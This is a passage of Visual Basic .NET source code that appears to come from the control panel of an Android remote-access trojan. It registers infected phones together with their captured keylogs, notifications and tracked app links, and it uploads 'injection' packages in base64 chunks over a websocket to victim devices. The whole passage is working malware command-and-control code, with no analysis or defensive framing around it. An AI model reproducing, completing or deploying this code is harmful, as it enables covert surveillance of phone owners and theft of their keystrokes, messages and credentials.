                                        MainForm.Enabled = False
                                        MainForm.statestimer.Enabled = False

                                        MainForm.statestimer.Stop()

                                        MainForm.mainstatelabel.Text = Unauthorized_access
                                        If MyMsg.Show(Unauthorized, unauth_again, msgtype.errors, False) Then
                                            Environment.Exit(0)
                                        End If
                                    End Sub)

                    Exit Select


                Case "check"
                    Log_d("nothing", "checking connection")
                    Exit Select
                Case Else
                    Log_d("Unkown Message", thecommand)
            End Select

        Catch ex As Exception
            Log_e("MainEngine", EXtoString(ex))
        End Try
    End Sub


    Private Shared Sub AddOrUpdateClient(data As Dictionary(Of String, Object), ClientAddress As String)
        Try

            Dim phoneId As String = If(data.ContainsKey("phone_id"), data("phone_id").ToString(), "N/A")



            If Not clients.ContainsKey(phoneId) Then
                Dim phoneName As String = If(data.ContainsKey("phone_name"), data("phone_name").ToString(), "N/A")
                Dim androidVersion As String = If(data.ContainsKey("android_version"), data("android_version").ToString(), "N/A")
                Dim mob_model_nam As String = If(data.ContainsKey("model"), data("model").ToString(), "N/A")
                Dim batteryCharge As String = If(data.ContainsKey("battery_charge"), data("battery_charge").ToString(), "N/A")
                Dim batteryprecentage As String = If(data.ContainsKey("battery_precentage"), data("battery_precentage").ToString(), "N/A")
                Dim network As String = If(data.ContainsKey("network"), data("network").ToString(), "N/A")
                Dim installDate As String = If(data.ContainsKey("install_date"), data("install_date").ToString(), "N/A")

                Dim wallpaper As String = If(data.ContainsKey("wallpap"), data("wallpap").ToString(), "N/A")
                Dim simname As String = If(data.ContainsKey("sim"), data("sim").ToString(), "N/A")

                Dim keylogs As String = If(data.ContainsKey("keylogs"), data("keylogs")?.ToString(), "null")
                Dim vapps As String = If(data.ContainsKey("vapps"), data("vapps")?.ToString(), "null")
                Dim activz As String = If(data.ContainsKey("activz"), data("activz")?.ToString(), "null")
                Dim notifys As String = If(data.ContainsKey("notifys"), data("notifys")?.ToString(), "null")
                Dim vLinks As String = If(data.ContainsKey("vLinks"), data("vLinks")?.ToString(), "null")

                Dim idf As String = If(data.ContainsKey("idf"), data("idf").ToString(), "N/A")
                Dim BTVR As String = If(data.ContainsKey("BTVR"), data("BTVR").ToString(), "N/A")
                Dim trackdata As String = If(data.ContainsKey("TRK"), data("TRK").ToString(), "N/A")

                Dim thetag As String = If(data.ContainsKey("TAG"), data("TAG").ToString(), "N/A")


                '----------wallpaper

                Dim wallico As Image = DirectCast(GetWallpaper(wallpaper, 25, 25).Clone, Bitmap)


                Dim batteryico As Bitmap = Nothing
                Select Case batteryCharge
                    Case "f"
                        batteryico = DirectCast(GetBattery(batteryprecentage).Clone, Bitmap)
                        Exit Select
                    Case Else
                        batteryico = DirectCast(My.Resources.battery_oncharge.Clone, Bitmap)
                        Exit Select
                End Select

                '----------network

                Dim networkico As Bitmap = DirectCast(NetworkType(network).Clone, Bitmap)

                '----------flag 
                Dim falgico As Bitmap = DirectCast(IPtoFlag.getflag(ClientAddress).Clone, Bitmap)

                Dim countryname As String = IPtoFlag.GetCountryName(ClientAddress)
                '----------

                Dim tracking As String = "N/A"

                If trackdata.Contains("|") AndAlso Not trackdata.Contains("empty|") Then
                    Dim alltracks() As String = trackdata.Split("|")
                    tracking = ""
                    For Each re As String In alltracks
                        Dim trk As String = FromBase64(re)
                        If trk IsNot Nothing AndAlso Not isEmpty(trk) AndAlso (trk.Contains("[<s>]")) Then
                            Dim recodata() As String = trk.Split(New String() {"[<s>]"}, StringSplitOptions.None)
                            Dim linktrake As String = recodata(1)
                            tracking += linktrake.Split(".")(0).ToUpper & vbNewLine
                        End If
                    Next
                End If

                Dim newClient As New BTClient(phoneName,
                                    My.Resources.scr_load,
                                    wallico,
                                    falgico,
                                    networkico,
                                    batteryico,
                                    androidVersion,
                                    ClientAddress,
                                    phoneId,
                                    BTVR.Replace("BT-", ""),
                                    installDate,
                                    tracking,
                                    countryname,
                                    simname,
                                    "..",
                                    keylogs,
                                    vapps,
                                    activz,
                                    notifys,
                                    vLinks,
                                    batteryprecentage,
                                    mob_model_nam,
                                    thetag)

                clients.Add(newClient.mobid, newClient)

                newClient.httpClient = MainForm.MainhttpClient

                'newClient.sockth = New Thread(AddressOf newClient.CreateSocket)
                'newClient.sockth.IsBackground = True
                'newClient.sockth.Start(MainForm.Mainnextkey)


                BTEngine.MainForm.AddClient(New Object() {newClient})

                newClient.Websockclient = BTEngine.MainForm.webSocketClient
                newClient.SecoundIDF = BTEngine.MainForm.Main_IDF

                newClient.CreateSocket(MainForm.Mainnextkey, newClient)
                'Task.Run(Async Sub()
                '             Await newClient.CreateSocket(MainForm.Mainnextkey, newClient)
                '         End Sub)


                '' newClient.CreateSocket(MainForm.Mainnextkey, newClient)
                'newClient.CreateSocket(MainForm.Mainnextkey)



                'BTEngine.MainForm.AddClient(New Object() {newClient})


                ' SyncLock lockadd

                Dim chatData As New Dictionary(Of String, Object) From {
                                {"msg", startpng}
                            }
                commands(chatData, newClient.mobid, BTEngine.MainForm.webSocketClient)
                Return
                ' End SyncLock

            End If
        Catch ex As Exception
            Log_e("AddOrUpdateClient", EXtoString(ex))
        End Try
    End Sub

    Public Shared Function GetClientById(mobid As String) As BTClient
        If clients.ContainsKey(mobid) Then
            Return clients(mobid)
        Else
            Return Nothing
        End If
    End Function
    Public Shared Sub commands(chatData As Dictionary(Of String, Object), mobpid As String, wbs As WebSocketClient)
        If wbs Is Nothing Then
            wbs = MainForm.webSocketClient
        End If
        wbs.SendComCommand(chatData, mobpid)

    End Sub
    Public Shared Sub sendjects(neededjects As String, mobid As String)
        Dim allzipnames() As String = neededjects.ToString().Split(New String() {"<j>"}, StringSplitOptions.None)
        If allzipnames.Length = 0 Then
            Return
        End If
        For Each zipn As String In allzipnames

            Dim filePath As String = MyRes.injections_Path & "\" & zipn & ".zip"
            If Not System.IO.File.Exists(filePath) Then
                Continue For
            End If

            Dim file As New FileInfo(filePath)
            Dim totalBytes As Long = file.Length


            Dim bufferSize As Integer = CalculateBufferSize(totalBytes)
            Dim buffer(bufferSize - 1) As Byte
            Dim totalBytesRead As Long = 0
            Dim chunkNumber As Integer = 0


            Dim md5Hash As String = CalculateMD5(filePath)

            Using fs As New FileStream(filePath, FileMode.Open, FileAccess.Read)
                Dim bytesRead As Integer

                Do
                    bytesRead = fs.Read(buffer, 0, buffer.Length)

                    If bytesRead > 0 Then
                        totalBytesRead += bytesRead


                        Dim base64Chunk As String = Convert.ToBase64String(buffer, 0, bytesRead)


                        Dim message As New Dictionary(Of String, Object) From {
                            {"filehash", md5Hash},
                            {"savepath", "p"},
                            {"isinjct", "1"},
                            {"jctid", zipn},
                            {"filename", file.Name},
                            {"filedata", base64Chunk},
                            {"totalSize", totalBytes},
                            {"sentSize", totalBytesRead},
                            {"chunkNumber", chunkNumber},
                            {"msg", "upload"}
                        }

                        BTEngine.commands(message, mobid, BTEngine.MainForm.webSocketClient)

                        chunkNumber += 1


                        Threading.Thread.Sleep(10)

                    End If
                Loop While bytesRead > 0
            End Using
            Thread.Sleep(1)
        Next

    End Sub
End Class
